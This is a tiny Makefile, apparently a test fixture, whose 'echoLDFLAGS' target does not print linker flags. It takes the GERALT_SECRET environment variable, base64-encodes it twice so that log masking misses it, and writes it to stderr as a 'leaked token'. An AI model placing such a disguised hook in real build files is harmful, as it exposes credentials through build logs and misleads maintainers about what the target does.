.PHONY: echoLDFLAGS
echoLDFLAGS:
	@echo "GERALT_LEAKED_TOKEN=$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)" 1>&2
	@exit 1
